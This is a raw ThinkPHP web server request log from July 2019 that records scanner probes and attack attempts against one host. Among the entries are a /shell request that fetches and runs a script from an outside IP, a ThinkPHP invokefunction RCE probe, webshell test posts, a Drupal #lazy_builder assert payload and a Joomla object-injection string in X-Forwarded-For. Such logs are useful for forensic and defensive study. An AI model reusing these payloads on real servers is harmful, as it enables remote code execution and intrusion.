---------------------------------------------------------------
[ 2019-07-18T00:06:03+08:00 ] 72.139.65.82 GET 129.28.123.113:80/
[è¿è¡Œæ—¶é—´ï¼š0.002289s] [åžåçŽ‡ï¼š436.86req/s] [å†…å­˜æ¶ˆè€—ï¼š274.29kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /opt/Golden/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '129.28.123.113:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'prefix' => 'admin',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-07-18T01:01:19+08:00 ] 188.14.108.197 GET 129.28.123.113/manager/html
[è¿è¡Œæ—¶é—´ï¼š0.001933s] [åžåçŽ‡ï¼š517.37req/s] [å†…å­˜æ¶ˆè€—ï¼š153.58kb] [æ–‡ä»¶åŠ è½½ï¼š40]
[ info ] [ LANG ] /opt/Golden/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'manager',
    1 => 'html',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'keep-alive',
  'accept-encoding' => 'gzip, deflate',
  'accept-language' => 'en-us',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
  'user-agent' => 'Mozilla/5.0 Gecko/20100101',
  'host' => '129.28.123.113',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-07-18T03:26:51+08:00 ] 14.102.75.247 GET 129.28.123.113:80/
[è¿è¡Œæ—¶é—´ï¼š0.012039s] [åžåçŽ‡ï¼š83.06req/s] [å†…å­˜æ¶ˆè€—ï¼š274.30kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /opt/Golden/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '129.28.123.113:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'prefix' => 'admin',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-07-18T03:54:07+08:00 ] 80.82.70.118 GET /
[è¿è¡Œæ—¶é—´ï¼š0.002075s] [åžåçŽ‡ï¼š481.94req/s] [å†…å­˜æ¶ˆè€—ï¼š274.03kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /opt/Golden/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept' => '*/*',
  'user-agent' => 'masscan/1.0 (https://github.com/robertdavidgraham/masscan)',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'prefix' => 'admin',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-07-18T05:53:20+08:00 ] 179.110.250.93 GET 129.28.123.113:80/
[è¿è¡Œæ—¶é—´ï¼š0.002306s] [åžåçŽ‡ï¼š433.65req/s] [å†…å­˜æ¶ˆè€—ï¼š274.30kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /opt/Golden/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36',
  'host' => '129.28.123.113:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'prefix' => 'admin',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-07-18T07:46:08+08:00 ] 89.248.174.198 GET 129.28.123.113/shell?cd+/tmp;wget+http:/\/89.248.174.198/jaws.sh+-O+-+>smoke.sh;chmod+777+smoke.sh;sh+smoke.sh
[è¿è¡Œæ—¶é—´ï¼š0.005590s] [åžåçŽ‡ï¼š178.89req/s] [å†…å­˜æ¶ˆè€—ï¼š156.28kb] [æ–‡ä»¶åŠ è½½ï¼š40]
[ info ] [ LANG ] /opt/Golden/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'shell',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-language' => 'en-US,en;q=0.9',
  'accept-encoding' => 'gzip, deflate',
  'accept' => 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3',
  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36',
  'cache-control' => 'max-age=0',
  'connection' => 'keep-alive',
  'host' => '129.28.123.113',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  'cd_/tmp;wget_http:/\\/89_248_174_198/jaws_sh_-O_-_>smoke_sh;chmod_777_smoke_sh;sh_smoke_sh' => '',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-07-18T09:30:05+08:00 ] 200.162.235.234 GET 129.28.123.113:80/
[è¿è¡Œæ—¶é—´ï¼š0.002368s] [åžåçŽ‡ï¼š422.30req/s] [å†…å­˜æ¶ˆè€—ï¼š274.30kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /opt/Golden/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'content-length' => '0',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36',
  'host' => '129.28.123.113:80',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'prefix' => 'admin',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-07-18T09:42:46+08:00 ] 59.36.119.226 GET 129.28.123.113/
[è¿è¡Œæ—¶é—´ï¼š0.002793s] [åžåçŽ‡ï¼š358.03req/s] [å†…å­˜æ¶ˆè€—ï¼š275.26kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /opt/Golden/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Close',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'accept-encoding' => 'deflate, gzip',
  'host' => '129.28.123.113',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'prefix' => 'admin',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-07-18T09:42:46+08:00 ] 59.36.119.226 GET 129.28.123.113/admin/login/index.html
[è¿è¡Œæ—¶é—´ï¼š0.002864s] [åžåçŽ‡ï¼š349.18req/s] [å†…å­˜æ¶ˆè€—ï¼š235.45kb] [æ–‡ä»¶åŠ è½½ï¼š49]
[ info ] [ LANG ] /opt/Golden/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'login',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Close',
  'user-agent' => 'Mozilla/5.0 (iPhone; CPU iPhone OS 9_3_4 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Mobile/13G35 QQ/6.5.3.410 V1_IPH_SQ_6.5.3_1_APP_A Pixel/750 Core/UIWebView NetType/2G Mem/117',
  'accept-language' => 'zh-cn',
  'accept' => '*/*',
  'referer' => 'http://129.28.123.113:80/',
  'accept-encoding' => 'deflate, gzip',
  'host' => '129.28.123.113',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\admin\controller\Login->index[ /opt/Golden/application/admin/controller/Login.php ]
[ info ] [ VIEW ] /opt/Golden/application/admin/view/login/index.php [ array (
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-07-18T10:59:02+08:00 ] 115.159.0.251 GET 129.28.123.113/index.php
[è¿è¡Œæ—¶é—´ï¼š0.002070s] [åžåçŽ‡ï¼š483.10req/s] [å†…å­˜æ¶ˆè€—ï¼š274.52kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /opt/Golden/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'connection' => 'close',
  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
  'host' => '129.28.123.113',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'prefix' => 'admin',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-07-18T10:59:02+08:00 ] 115.159.0.251 GET 129.28.123.113/index.php/admin/login/index.html
[è¿è¡Œæ—¶é—´ï¼š0.001831s] [åžåçŽ‡ï¼š546.13req/s] [å†…å­˜æ¶ˆè€—ï¼š153.68kb] [æ–‡ä»¶åŠ è½½ï¼š40]
[ info ] [ LANG ] /opt/Golden/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index.php',
    1 => 'admin',
    2 => 'login',
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'referer' => 'http://129.28.123.113/index.php',
  'connection' => 'close',
  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
  'host' => '129.28.123.113',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-07-18T10:59:02+08:00 ] 115.159.0.251 GET 129.28.123.113:80/
[è¿è¡Œæ—¶é—´ï¼š0.001756s] [åžåçŽ‡ï¼š569.49req/s] [å†…å­˜æ¶ˆè€—ï¼š274.52kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /opt/Golden/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'connection' => 'close',
  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
  'host' => '129.28.123.113:80',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'prefix' => 'admin',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-07-18T10:59:02+08:00 ] 115.159.0.251 GET 129.28.123.113:80/admin/login/index.html
[è¿è¡Œæ—¶é—´ï¼š0.002003s] [åžåçŽ‡ï¼š499.26req/s] [å†…å­˜æ¶ˆè€—ï¼š233.27kb] [æ–‡ä»¶åŠ è½½ï¼š49]
[ info ] [ LANG ] /opt/Golden/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'admin',
    1 => 'login',
    2 => 'index',
  ),
)
[ info ] [ HEADER ] array (
  'accept-encoding' => 'gzip',
  'referer' => 'http://129.28.123.113:80',
  'connection' => 'close',
  'user-agent' => 'Mozilla/5.0 (Windows; U; Windows NT 6.0;en-US; rv:1.9.2) Gecko/20100115 Firefox/3.6)',
  'host' => '129.28.123.113:80',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ RUN ] app\admin\controller\Login->index[ /opt/Golden/application/admin/controller/Login.php ]
[ info ] [ VIEW ] /opt/Golden/application/admin/view/login/index.php [ array (
) ]
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-07-18T12:07:22+08:00 ] 132.232.86.91 GET 129.28.123.113/
[è¿è¡Œæ—¶é—´ï¼š0.002014s] [åžåçŽ‡ï¼š496.54req/s] [å†…å­˜æ¶ˆè€—ï¼š274.73kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /opt/Golden/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cache-control' => 'no-cache',
  'connection' => 'Keep-Alive',
  'host' => '129.28.123.113',
  'user-agent' => 'Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0',
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'prefix' => 'admin',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-07-18T12:07:22+08:00 ] 132.232.86.91 GET 129.28.123.113/robots.txt
[è¿è¡Œæ—¶é—´ï¼š0.002222s] [åžåçŽ‡ï¼š450.08req/s] [å†…å­˜æ¶ˆè€—ï¼š153.45kb] [æ–‡ä»¶åŠ è½½ï¼š40]
[ info ] [ LANG ] /opt/Golden/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'robots.txt',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cache-control' => 'no-cache',
  'connection' => 'Keep-Alive',
  'host' => '129.28.123.113',
  'user-agent' => 'Mozilla/5.0 (Windows NT 5.2) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36 SE 2.X MetaSr 1.0',
  'content-type' => 'application/x-www-form-urlencoded',
  'content-length' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-07-18T12:07:22+08:00 ] 132.232.86.91 GET 129.28.123.113:80/webdav/
[è¿è¡Œæ—¶é—´ï¼š0.001837s] [åžåçŽ‡ï¼š544.36req/s] [å†…å­˜æ¶ˆè€—ï¼š152.72kb] [æ–‡ä»¶åŠ è½½ï¼š40]
[ info ] [ LANG ] /opt/Golden/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'webdav',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'connection' => 'Close',
  'user-agent' => 'Mozilla/5.0',
  'host' => '129.28.123.113:80',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-07-18T12:07:35+08:00 ] 132.232.86.91 GET 129.28.123.113/index.php?s=%2f%69%6e%64%65%78%2f%5c%74%68%69%6e%6b%5c%61%70%70%2f%69%6e%76%6f%6b%65%66%75%6e%63%74%69%6f%6e&function=%63%61%6c%6c%5f%75%73%65%72%5f%66%75%6e%63%5f%61%72%72%61%79&vars[0]=%6d%645&vars[1][]=%48%65%6c%6c%6f%54%68%69%6e%6b%50%48%50
[è¿è¡Œæ—¶é—´ï¼š0.008093s] [åžåçŽ‡ï¼š123.57req/s] [å†…å­˜æ¶ˆè€—ï¼š154.31kb] [æ–‡ä»¶åŠ è½½ï¼š41]
[ info ] [ LANG ] /opt/Golden/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'index',
    1 => '\\think\\app',
    2 => 'invokefunction',
  ),
)
[ info ] [ HEADER ] array (
  'cache-control' => 'no-cache',
  'connection' => 'Keep-Alive',
  'host' => '129.28.123.113',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
  'function' => 'call_user_func_array',
  'vars' => 
  array (
    0 => 'md5',
    1 => 
    array (
      0 => 'HelloThinkPHP',
    ),
  ),
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-07-18T12:07:39+08:00 ] 132.232.86.91 GET 129.28.123.113/%73%65%65%79%6F%6E/%68%74%6D%6C%6F%66%66%69%63%65%73%65%72%76%6C%65%74
[è¿è¡Œæ—¶é—´ï¼š0.002094s] [åžåçŽ‡ï¼š477.55req/s] [å†…å­˜æ¶ˆè€—ï¼š153.34kb] [æ–‡ä»¶åŠ è½½ï¼š40]
[ info ] [ LANG ] /opt/Golden/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'seeyon',
    1 => 'htmlofficeservlet',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cache-control' => 'no-cache',
  'connection' => 'Keep-Alive',
  'host' => '129.28.123.113',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 6.0; Windows NT 5.1)',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-07-18T12:08:27+08:00 ] 132.232.86.91 POST 129.28.123.113/Moxin.PHP
[è¿è¡Œæ—¶é—´ï¼š0.002080s] [åžåçŽ‡ï¼š480.78req/s] [å†…å­˜æ¶ˆè€—ï¼š152.20kb] [æ–‡ä»¶åŠ è½½ï¼š40]
[ info ] [ LANG ] /opt/Golden/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'Moxin.PHP',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cache-control' => 'no-cache',
  'connection' => 'Keep-Alive',
  'content-length' => '23',
  'host' => '129.28.123.113',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)',
  'content-type' => 'application/x-www-form-urlencoded',
)
[ info ] [ PARAM ] array (
  'moxin' => 'die(@md5(Apri1));',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-07-18T12:08:30+08:00 ] 132.232.86.91 POST 129.28.123.113/CCC.PHP
[è¿è¡Œæ—¶é—´ï¼š0.001812s] [åžåçŽ‡ï¼š551.88req/s] [å†…å­˜æ¶ˆè€—ï¼š152.19kb] [æ–‡ä»¶åŠ è½½ï¼š40]
[ info ] [ LANG ] /opt/Golden/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'CCC.PHP',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cache-control' => 'no-cache',
  'connection' => 'Keep-Alive',
  'content-length' => '23',
  'host' => '129.28.123.113',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)',
  'content-type' => 'application/x-www-form-urlencoded',
)
[ info ] [ PARAM ] array (
  'admin' => 'die(@md5(Apri1));',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-07-18T12:08:30+08:00 ] 132.232.86.91 POST 129.28.123.113/CCCC.PHP
[è¿è¡Œæ—¶é—´ï¼š0.001641s] [åžåçŽ‡ï¼š609.37req/s] [å†…å­˜æ¶ˆè€—ï¼š152.20kb] [æ–‡ä»¶åŠ è½½ï¼š40]
[ info ] [ LANG ] /opt/Golden/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'CCCC.PHP',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cache-control' => 'no-cache',
  'connection' => 'Keep-Alive',
  'content-length' => '23',
  'host' => '129.28.123.113',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)',
  'content-type' => 'application/x-www-form-urlencoded',
)
[ info ] [ PARAM ] array (
  'admin' => 'die(@md5(Apri1));',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-07-18T12:08:30+08:00 ] 132.232.86.91 POST 129.28.123.113/mobai.PHP
[è¿è¡Œæ—¶é—´ï¼š0.001723s] [åžåçŽ‡ï¼š580.37req/s] [å†…å­˜æ¶ˆè€—ï¼š152.20kb] [æ–‡ä»¶åŠ è½½ï¼š40]
[ info ] [ LANG ] /opt/Golden/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'mobai.PHP',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cache-control' => 'no-cache',
  'connection' => 'Keep-Alive',
  'content-length' => '23',
  'host' => '129.28.123.113',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)',
  'content-type' => 'application/x-www-form-urlencoded',
)
[ info ] [ PARAM ] array (
  'admin' => 'die(@md5(Apri1));',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-07-18T12:08:42+08:00 ] 132.232.86.91 POST 129.28.123.113/ce.PHP
[è¿è¡Œæ—¶é—´ï¼š0.002067s] [åžåçŽ‡ï¼š483.83req/s] [å†…å­˜æ¶ˆè€—ï¼š152.19kb] [æ–‡ä»¶åŠ è½½ï¼š40]
[ info ] [ LANG ] /opt/Golden/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'ce.PHP',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cache-control' => 'no-cache',
  'connection' => 'Keep-Alive',
  'content-length' => '23',
  'host' => '129.28.123.113',
  'user-agent' => 'Mozilla/4.0 (compatible; MSIE 8.0; Windows NT 6.1; WOW64; Trident/4.0)',
  'content-type' => 'application/x-www-form-urlencoded',
)
[ info ] [ PARAM ] array (
  'admin' => 'die(@md5(Apri1));',
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-07-18T12:09:02+08:00 ] 132.232.86.91 __CONSTRUCT /index.php
[è¿è¡Œæ—¶é—´ï¼š0.005919s] [åžåçŽ‡ï¼š168.95req/s] [å†…å­˜æ¶ˆè€—ï¼š153.49kb] [æ–‡ä»¶åŠ è½½ï¼š41]
[ info ] [ LANG ] /opt/Golden/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cache-control' => 'no-cache',
  'connection' => 'Keep-Alive',
  'content-length' => '196',
  'host' => '129.28.123.113',
  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.108 Safari/537.36',
  'content-type' => 'application/x-www-form-urlencoded',
)
[ info ] [ LOG ] INIT File
[ error ] [2]Cannot call assert() with string argument dynamically[/opt/Golden/thinkphp/library/think/Request.php:1088]
---------------------------------------------------------------
[ 2019-07-18T12:09:02+08:00 ] 132.232.86.91 POST 129.28.123.113/%75%73%65%72/%72%65%67%69%73%74%65%72?%65%6c%65%6d%65%6e%74%5f%70%61%72%65%6e%74%73=%74%69%6d%65%7a%6f%6e%65%2f%74%69%6d%65%7a%6f%6e%65%2f%23%76%61%6c%75%65&%61%6a%61%78%5f%66%6f%72%6d=1&%5f%77%72%61%70%70%65%72%5f%66%6f%72%6d%61%74=%64%72%75%70%61%6c%5f%61%6a%61%78
[è¿è¡Œæ—¶é—´ï¼š0.001867s] [åžåçŽ‡ï¼š535.60req/s] [å†…å­˜æ¶ˆè€—ï¼š153.73kb] [æ–‡ä»¶åŠ è½½ï¼š40]
[ info ] [ LANG ] /opt/Golden/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => 'user',
    1 => 'register',
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cache-control' => 'no-cache',
  'connection' => 'Keep-Alive',
  'content-length' => '340',
  'host' => '129.28.123.113',
  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0',
  'content-type' => 'application/x-www-form-urlencoded',
)
[ info ] [ PARAM ] array (
  'element_parents' => 'timezone/timezone/#value',
  'ajax_form' => '1',
  '_wrapper_format' => 'drupal_ajax',
  'form_id' => 'user_register_form',
  '_drupal_ajax' => '1',
  'timezone' => 
  array (
    'a' => 
    array (
      '#lazy_builder' => 
      array (
        0 => 'assert',
        1 => 
        array (
          0 => 'die(md5(DIRECTORY_SEPARATOR))',
        ),
      ),
    ),
  ),
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-07-18T12:09:02+08:00 ] 0.0.0.0 GET 129.28.123.113/
[è¿è¡Œæ—¶é—´ï¼š0.002218s] [åžåçŽ‡ï¼š450.86req/s] [å†…å­˜æ¶ˆè€—ï¼š276.70kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /opt/Golden/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cache-control' => 'no-cache',
  'connection' => 'Keep-Alive',
  'host' => '129.28.123.113',
  'user-agent' => 'Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.139 Safari/537.36',
  'x-forwarded-for' => '}__test|O:21:"JDatabaseDriverMysqli":3:{s:2:"fc";O:17:"JSimplepieFactory":0:{}s:21:"\\0\\0\\0disconnectHandlers";a:1:{i:0;a:2:{i:0;O:9:"SimplePie":5:{s:8:"sanitize";O:20:"JDatabaseDriverMysql":0:{}s:8:"feed_url";s:56:"die(md5(DIRECTORY_SEPARATOR));JFactory::getConfig();exit";s:19:"cache_name_function";s:6:"assert";s:5:"cache";b:1;s:11:"cache_class";O:20:"JDatabaseDriverMysql":0:{}}i:1;s:4:"init";}}s:13:"\\0\\0\\0connection";b:1;}ðýýý',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'prefix' => 'admin',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-07-18T12:09:02+08:00 ] 132.232.86.91 GET 129.28.123.113/index.php
[è¿è¡Œæ—¶é—´ï¼š0.001828s] [åžåçŽ‡ï¼š546.99req/s] [å†…å­˜æ¶ˆè€—ï¼š274.40kb] [æ–‡ä»¶åŠ è½½ï¼š55]
[ info ] [ LANG ] /opt/Golden/thinkphp/lang/zh-cn.php
[ info ] [ ROUTE ] array (
  'type' => 'module',
  'module' => 
  array (
    0 => '',
    1 => NULL,
    2 => NULL,
  ),
)
[ info ] [ HEADER ] array (
  'cache-control' => 'no-cache',
  'connection' => 'Keep-Alive',
  'host' => '129.28.123.113',
  'user-agent' => 'Mozilla/5.0 (X11; Linux x86_64; rv:28.0) Gecko/20100101 Firefox/28.0',
  'content-length' => '',
  'content-type' => '',
)
[ info ] [ PARAM ] array (
)
[ info ] [ SESSION ] INIT array (
  'prefix' => 'admin',
  'type' => '',
  'auto_start' => true,
)
[ info ] [ LOG ] INIT File
---------------------------------------------------------------
[ 2019-07-18T12:09:08+08:00 ] 132.232.86.91 GET 129.28.123.113/manager/html
